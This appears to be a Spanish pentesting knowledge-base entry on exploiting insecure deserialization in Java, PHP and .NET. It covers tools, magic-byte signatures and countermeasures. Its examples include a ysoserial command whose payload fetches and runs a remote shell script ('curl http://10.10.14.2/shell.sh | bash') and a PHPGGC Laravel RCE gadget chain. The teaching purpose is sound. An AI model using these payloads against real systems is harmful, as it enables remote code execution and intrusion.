---
title: Explotación de Deserialización Insegura
slug: explotacion-deserialization
aliases: [Insecure Deserialization, Object Injection RCE, ysoserial, Java deserialization, CommonsCollections, rO0AB, .NET deserialization, marshalsec]
fase: [Explotación]
plataforma: Web
dificultad: Avanzada
mitre: [T1190]
related: [analisis-deserialization]
learning_refs: [portswigger/deserialization-modifying-serialized-objects, portswigger/deserialization-modifying-serialized-data-types, portswigger/deserialization-using-application-functionality]
---

# Explotación de Deserialización Insegura

## Descripción
La deserialización insegura ocurre cuando una aplicación confía ciegamente en datos serializados provenientes del usuario sin validarlos adecuadamente. Un atacante puede manipular estos datos para inyectar objetos maliciosos que, al ser reconstruidos (deserializados) por el servidor, ejecutan código arbitrario o provocan ataques de denegación de servicio. Esta vulnerabilidad es común en aplicaciones empresariales Java, PHP y .NET que utilizan protocolos de comunicación personalizados o estados de sesión serializados.

## Herramientas
- **ysoserial** — herramienta para generar payloads que explotan cadenas de gadgets en bibliotecas Java comunes.
- **PHPGGC** — generador de cadenas de gadgets para explotar vulnerabilidades de deserialización en aplicaciones PHP.
- **Burp Suite** (Java Deserialization Scanner) — extensión para detectar y explotar deserialización en tráfico HTTP.
- **ysoserial.net** — versión para el ecosistema .NET (BinaryFormatter, JSON.NET, etc.).

## Comandos / Ejemplos

### Explotación en Java con ysoserial
```bash
# Generar un payload para la cadena de gadgets CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 'curl http://10.10.14.2/shell.sh | bash' > payload.bin
# El archivo resultante se envía al servidor mediante el parámetro vulnerable (ej. Base64 encoded)
cat payload.bin | base64 -w 0
```

### Explotación en PHP con PHPGGC
```bash
# Generar una cadena de gadgets para Laravel (RCE via __destruct)
./phpggc Laravel/RCE1 system 'whoami'
# Resultado: Cadena serializada lista para ser enviada en un cookie o parámetro
O:24:"Illuminate\Bus\Dispatcher":1:{s:11:"...
```

### Identificación de cabeceras mágicas
```bash
# Identificar firmas de serialización comunes en peticiones:
# Java: rO0AB (Base64 de 0xAC ED 00 05)
# .NET: AAEAAAD///// (Base64 de BinaryFormatter)
# PHP: a:2:{i:0;s:4:"... (Texto plano o codificado)
```

## Contramedidas
- No deserializar datos provenientes de fuentes no confiables.
- Implementar validación basada en listas blancas de clases permitidas durante la deserialización (Look-ahead deserialization).
- Utilizar formatos de serialización de datos puros como JSON o XML en lugar de serialización de objetos nativos.
- Mantener actualizadas las bibliotecas de terceros para mitigar cadenas de gadgets conocidas.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
